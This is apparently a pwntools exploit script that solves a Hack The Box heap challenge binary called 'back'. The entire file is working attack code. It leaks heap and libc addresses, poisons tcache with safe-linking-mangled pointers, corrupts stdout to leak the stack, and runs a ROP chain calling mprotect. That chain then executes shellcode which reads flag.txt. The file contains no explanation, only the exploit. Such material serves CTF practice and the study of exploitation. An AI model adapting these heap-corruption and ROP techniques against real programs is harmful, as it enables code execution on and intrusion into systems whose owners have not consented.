from pwn import *
import sys
import os

remote_ip,port = 'docker.hackthebox.eu', 31780
binary = './back'
context.arch='amd64'

if len(sys.argv)>1:
    io = remote(remote_ip,port)
    context.noptrace=True

else:
    io = process(binary,env={"LD_PRELOAD":"./libc.so.6"})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def alloc(size,data):
    sla("Choice: ",'1')
    sla("Size: ",str(size))
    sa("Data: ",data)

def free(idx):
    sla("Choice: ",'2')
    sla("Index: ",str(idx))

def edit(idx,data):
    sla("Choice: ",'3')
    sla("Index: ",str(idx))
    sla("Data: ",data)


if __name__== "__main__":
    for i in range(8):
        alloc(0x90,"aaaaa")
    alloc(10,"aaaa") # 8 
    alloc(0x90,"aaaaa") # 9
    alloc(0x90,"bbbb") # 10
    alloc(10,"aaaa") # 11
    for i in range(7):      # 7 is not free  7 chunks in tcache
        free(i)
    free(7)   # unsorted
    free(10)  # unsorted
    free(9)   # big in unsorted    # freed - 0 - 6, 7, 10, 9
    alloc(0x130,"a"*0xa0) # 0
    free(0)
    heap = u64(io.recvline()[-7:-1]+"\x00\x00")-0x6f0
    log.info("heap @ "+str(hex(heap)))
    alloc(0x130,"a"*0xa9) # 0
    free(0)
    libc = u64(io.recvline()[-7:-1]+"\x00\x00")-0x1e3c61#+0x1e6e30-0x32b0
    hook = libc+0x1e6e30# +0x1e6e30-0x32b0
    log.info("libc @ "+str(hex(libc)))   # 0x140 is in tcache and only 1 0xa0 is in unsorted bin
    en_libc = hook ^ (heap>>12)
    en_strcut = (heap+0x10) ^ (heap>>12)
    payload = p64(0)*3 +p64(0xe1)+ p64(en_strcut)
    heap_byte = ((heap + 0xa20) ^ (heap>>12)) & 0xff
    log.info("byte is "+str(hex(heap_byte)))
    alloc(0xd0,"aaaa") # 0
    alloc(0xd0,payload) # 1
    alloc(0xd0,"aaaa") # 2
    mov_rdx_12 = libc+0x0000000000143988
    free(0)
    free(1)
    free(2)
    edit(2,p8(heap_byte))
    alloc(0xd0,"aaa")
    shellcode = asm("""mov rax,2
    xor rdx,rdx
    push rdx
    mov rdi, 0x7478742e67616c
    push rdi
    push rsp
    pop rdi
    mov rdx, 0
    mov rsi, 0

    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, rcx
    mov rdx, 50

    syscall

    mov rax, 1
    mov rdi, 1
    mov rdx, 50

    syscall
""")
    sc=p64(0)*4 + shellcode
    alloc(0xd0,sc)
    stdout = libc+0x1e46c0
    payload = p64(0) + p64(1) + p64(0)*18 + p64(stdout-16)
    alloc(0xd0,payload)    # tcache struct at index 2
    payload = p64(0)*2+p64(0x0fbad3887)+ p64(0)*3+p64(libc+0x1e7600) + p64(libc+0x1e76010)*2
    alloc(0x50,payload)
    stack = u64(io.recv(6)+"\x00\x00")
    diff = stack - (stack&~0xfff)
    log.info(diff)
    stack = (stack&~7)-8
    log.info("stack @ "+str(hex(stack-0x120)))
    free(2)
    payload = p64(0)*15 + p64(0x0001000000000000) + p64(0)*63 + p64(stack-0x300)
    alloc(0x280,payload)
    gdb.attach(io)
    pop_rdi = libc+0x000000000002858f
    pop_rax = libc+0x0000000000045580
    pop_rsi = libc+0x000000000002ac3f
    pop_rdx_r12 = libc+0x0000000000114161
    syscall_ret = libc+0x000920d9
    ret = 0x0000000000026699
    rop = p64(libc+ret)*100
    rop+= p64(pop_rdi) + p64(heap)
    rop+= p64(pop_rax) + p64(10)
    rop+= p64(pop_rsi) + p64(0x1000)
    rop+= p64(pop_rdx_r12) + p64(7) + p64(0)
    rop+= p64(syscall_ret) + p64(heap+0xa40)
    print(len(rop))
    alloc(0x400,rop)
    io.interactive()
